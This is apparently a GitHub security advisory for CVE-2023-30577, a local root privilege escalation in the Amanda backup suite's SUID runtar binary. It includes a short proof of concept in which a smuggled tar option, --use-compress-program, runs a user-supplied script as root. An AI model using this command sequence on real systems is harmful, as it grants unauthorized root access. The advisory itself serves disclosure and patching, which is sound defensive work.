# Local privilege escalation

GHSA-crrw-v393-h5q3
Jul 26, 2023

## Package

amanda

## Affected versions

< 3.5.3

## Patched versions

3.5.4

## Description

### Summary

To exploit this vulnerability one must have an access to the unprivileged backup user and craft arguments to the SUID runtar binary.

### Details

The SUID binary "runtar" can accept the possibly malicious GNU tar options if fed with some non-argument option starting with "--exclude" (say --exclude-vcs). The following option will be accepted as "good" and it could be an option passing some script/binary that would be executed with root permissions.

The problematic code is located in client-src/runtar.c file. The patch is available at your request.

I've registered CVE-2023-30577 at MITRE for this vulnerability.

### PoC

$ whoami

backup

$ ls -l /usr/local/libexec/amanda/runtar

-rwsr-x--- 1 root backup 25984 Apr 14 12:01 /usr/local/libexec/amanda/runtar

$ cat /tmp/poc-id.sh

#!/bin/sh

whoami > /tmp/poc-id.out

chmod 666 /tmp/poc-id.out

$ /usr/local/libexec/amanda/runtar NOCONFIG tar --create --file /dev/null --exclude-vcs --use-compress-program /tmp/poc-id.sh /dev/null

tar: Removing leading `/' from member names

$ cat /tmp/poc-id.out

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
